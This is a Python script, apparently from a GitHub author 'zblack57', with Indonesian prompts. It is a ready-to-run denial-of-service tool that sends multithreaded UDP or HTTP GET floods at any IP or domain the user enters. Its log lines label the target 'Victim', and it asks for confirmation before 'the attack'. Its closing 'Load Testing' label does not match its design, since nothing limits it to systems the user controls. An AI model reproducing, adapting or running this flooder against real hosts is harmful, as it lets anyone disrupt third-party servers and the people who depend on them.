#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import socket
import sys
import time
import threading
import signal
from colorama import Fore, Style, init

init(autoreset=True)

# ====================== KONFIGURASI ======================
MAX_THREADS = 500          # Batas maksimal thread (jangan terlalu tinggi di Termux)
MAX_DURATION = 300         # Maksimal 5 menit (300 detik)

stop_attack = False
packet_count = 0
lock = threading.Lock()

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n{Fore.RED}[!] Serangan dihentikan oleh user (Ctrl+C)")
    stop_attack = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def banner():
    clear()
    print(f"""{Fore.CYAN}
\033[97m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[97m ▒█████╗▒▒███╗▒██╗▒▒▒▒▒██╗▒███╗▒▒██████╗▒▒▒██╗▒▒██╗██╗████████╗▒▒███╗▒▒████╗▒▒███╗▒
\033[97m ▒██╔══╝██╔══██╗██║▒▒▒██║██╔══██╗██╔══██╗▒▒██║▒▒██║██║▒▒▒██╔══╝██╔══██╗██▒████▒██║▒
\033[97m ▒██║▒▒▒██║▒▒██║▒██║▒██║▒██║▒▒██║██║▒▒██║▒▒██║▒▒██║██║▒▒▒██║▒▒▒██║▒▒██║██╔═██╗▒██║▒ 
\033[97m ▒█████╗██║▒▒██║▒▒████║▒▒██║▒▒██║██║▒▒██║▒▒██║▒▒██║██║▒▒▒██║▒▒▒██║▒▒██║██║▒██║▒██║▒
\033[97m ▒╚══██║███████║▒▒▒██╔╝▒▒███████║██║███╔╝▒▒███████║██║▒▒▒██║▒▒▒███████║██║▒██║▒██║▒
\033[97m ▒█████║██╔══██║▒▒▒██║▒▒▒██╔══██║██╔═══╝▒▒▒██╔══██║██║▒▒▒██║▒▒▒██║▒▒██║██║▒╚═╝▒██║▒ 
\033[97m ▒╚════╝╚═╝▒▒╚═╝▒▒▒╚═╝▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒▒▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒╚═╝▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒▒▒╚═╝▒
\033[97m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
    print(f"\033[97m ╔{'═' * 80}╗")
    print(f"\033[97m ║ \033[100m{' ' * 4}github{' ' * 63}\033[0m ║")
    print(f"\033[97m ║ \033[100m{' ' * 4}zblack57{' ' * 56}\033[0m ║")
    print(f"\033[97m ╚{'═' * 80}╝")

# ====================== UDP FLOOD ======================
def udp_flood(ip, port, duration, threads, packet_size=1024):
    global stop_attack, packet_count
    message = b"X" * packet_size
    target = (ip, port)
    end_time = time.time() + duration

    def worker():
        global packet_count
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_attack and time.time() < end_time:
            try:
                s.sendto(message, target)
                with lock:
                    packet_count += 1
                    current = packet_count
                    
                # Logging style seperti script awal
                if current % 50 == 0:   # Agar tidak terlalu spam
                    print(f"{Fore.WHITE}[{Fore.GREEN}{current:,}{Fore.WHITE}] {Fore.CYAN}Victim port address¿ {Fore.MAGENTA}{ip}:{port} {Fore.RED}Sent packet")
                    print(f"{Fore.GREEN}[][][][] {Fore.YELLOW}Victim port address¿ {Fore.BLUE}{ip} {Fore.LIGHTMAGENTA_EX}Sent packet{Style.RESET_ALL}")
            except:
                pass
        s.close()

    print(f"{Fore.YELLOW}[+] Starting UDP Flood with {threads} threads to {ip}:{port}\n")
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

# ====================== HTTP FLOOD ======================
def http_flood(ip, port, duration, threads):
    global stop_attack, packet_count
    end_time = time.time() + duration

    def worker():
        global packet_count
        while not stop_attack and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n\r\n".encode()
                s.sendall(request)
                s.close()
                
                with lock:
                    packet_count += 1
                    current = packet_count
                
                if current % 30 == 0:
                    print(f"{Fore.WHITE}[{Fore.GREEN}{current:,}{Fore.WHITE}] {Fore.CYAN}Http-flood {Fore.GREEN}Sent → {Fore.MAGENTA}{ip}:{port} {Fore.YELLOW}working")
                    print(f"{Fore.LIGHTYELLOW_EX}Http-flood {Fore.WHITE}{current} {Fore.MAGENTA}| {ip} | {Fore.GREEN}working{Style.RESET_ALL}")
            except:
                pass

    print(f"{Fore.YELLOW}[+] Starting HTTP Flood with {threads} threads to {ip}:{port}\n")
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

# ====================== MAIN ======================
def main():
    banner()

    print(f"{Fore.CYAN}┏━━ Target Configuration ━━⬣")
    target_input = input(f"{Fore.CYAN}┗> Target IP / Domain : {Fore.WHITE}")
    try:
        ip = socket.gethostbyname(target_input)
        print(f"{Fore.GREEN}[!] Resolved {target_input} to {ip}")
    except socket.gaierror:
        print(f"{Fore.RED}[!] Gagal mendapatkan IP dari domain tersebut.")
        sys.exit()

    try:
        port = int(input(f"{Fore.CYAN}┗> Port               : {Fore.WHITE}"))
    except:
        print(f"{Fore.RED}Port tidak valid!")
        sys.exit()

    try:
        duration = int(input(f"{Fore.CYAN}┗> Duration (detik)   : {Fore.WHITE}"))
        if duration > 300:
            duration = 300
            print(f"{Fore.YELLOW}[!] Durasi dibatasi maksimal 300 detik.")
    except:
        print(f"{Fore.RED}Durasi tidak valid!")
        sys.exit()

    print(f"\n{Fore.CYAN}┏━━ Attack Type ━━⬣")
    print(f"   {Fore.WHITE}[1] UDP Flood")
    print(f"   {Fore.WHITE}[2] HTTP Flood")
    attack_type = input(f"{Fore.CYAN}┗> Pilih (1/2)         : {Fore.WHITE}")

    confirm = input(f"\n{Fore.RED}Ketik {Fore.WHITE}'YA' {Fore.RED}untuk memulai attack: {Fore.WHITE}")
    if confirm.upper() != "YA":
        print(f"{Fore.RED}Dibatalkan.")
        sys.exit()

    try:
        threads = int(input(f"\n{Fore.CYAN}Jumlah Threads (10-400) : {Fore.WHITE}"))
        threads = max(10, min(threads, 400))
    except:
        threads = 150

    global packet_count
    packet_count = 0
    start_time = time.time()

    print(f"\n{Fore.GREEN}{'═' * 60}")
    print(f"           LOAD TESTING DIMULAI - LOGS ACTIVE")
    print(f"{'═' * 60}\n")

    try:
        if attack_type == "1":
            udp_flood(ip, port, duration, threads)
        elif attack_type == "2":
            http_flood(ip, port, duration, threads)
    except KeyboardInterrupt:
        pass
    finally:
        elapsed = int(time.time() - start_time)
        print(f"\n{Fore.GREEN}[✓] Load Testing selesai dalam {elapsed} detik.")
        print(f"{Fore.CYAN}Total packets sent : {Fore.WHITE}{packet_count:,}")
        print(f"{Fore.CYAN}Terima kasih telah menggunakan tool ini.")

if __name__ == "__main__":
    main()
